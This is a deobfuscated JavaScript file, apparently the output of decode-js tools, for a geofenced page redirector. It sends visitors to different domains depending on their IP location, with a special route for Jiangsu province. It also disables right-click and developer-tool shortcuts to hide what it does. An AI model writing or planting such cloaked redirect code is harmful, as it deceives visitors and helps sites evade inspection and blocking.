//Wed Aug 06 2025 07:12:27 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
let redirectTimer;
const defaultTarget = "https://m5js.top",
  jsTargetDomain = "https://m5.m5cc.cc",
  pathAndQueryString = window.location.pathname + window.location.search + window.location.hash;
function redirectToDomain(_0x3d26b6) {
  window.location.href = _0x3d26b6;
}
function checkIP() {
  const _0x23aa30 = document.createElement("script");
  _0x23aa30.src = "https://api.ip.sb/jsonip?callback=getIP";
  document.body.appendChild(_0x23aa30);
}
function getIP(_0x1080d4) {
  const _0x5ec357 = _0x1080d4.ip;
  !_0x5ec357 || _0x5ec357.trim() === "" ? checkDomain() : fetchLocation(_0x5ec357);
}
async function fetchLocation(_0x1fe338) {
  try {
    const _0x3d0c3d = await fetch("https://ipapi.co/" + _0x1fe338 + "/json/"),
      _0x2f1516 = await _0x3d0c3d.json(),
      _0x322d76 = (_0x2f1516.country || "").toUpperCase(),
      _0x35e533 = (_0x2f1516.region || "").toLowerCase();
    _0x322d76 === "CN" ? _0x35e533 === "jiangsu" ? redirectToDomain(jsTargetDomain + pathAndQueryString) : checkDomain() : redirectToDomain(defaultTarget + pathAndQueryString);
  } catch (_0x4b3b1b) {
    console.error("获取位置失败:", _0x4b3b1b);
    checkDomain();
  }
}
async function checkDomain() {
  try {
    const _0x3f9f29 = Date.now(),
      _0x37331c = "./dm1.json?timestamp=" + _0x3f9f29,
      _0x4c1937 = await fetch(_0x37331c),
      _0x53fdb4 = await _0x4c1937.json(),
      _0x11f209 = Math.floor(Math.random() * _0x53fdb4.length),
      _0x50e6a4 = _0x53fdb4[_0x11f209];
    redirectToDomain("https://" + _0x50e6a4 + pathAndQueryString);
  } catch (_0x5e20be) {
    console.error("读取 JSON 域名失败:", _0x5e20be);
    redirectToDomain(defaultTarget + pathAndQueryString);
  }
}
document.addEventListener("DOMContentLoaded", function () {
  checkIP();
  redirectTimer = setTimeout(checkDomain, 5000);
});
window.addEventListener("beforeunload", function () {
  clearTimeout(redirectTimer);
});
document.addEventListener("contextmenu", function (_0x232d30) {
  _0x232d30.preventDefault();
});
document.addEventListener("keydown", function (_0x2f94c0) {
  (_0x2f94c0.key === "F12" || _0x2f94c0.ctrlKey && _0x2f94c0.shiftKey && _0x2f94c0.key.toUpperCase() === "I" || _0x2f94c0.ctrlKey && _0x2f94c0.shiftKey && _0x2f94c0.key.toUpperCase() === "J" || _0x2f94c0.ctrlKey && _0x2f94c0.key.toUpperCase() === "U") && _0x2f94c0.preventDefault();
});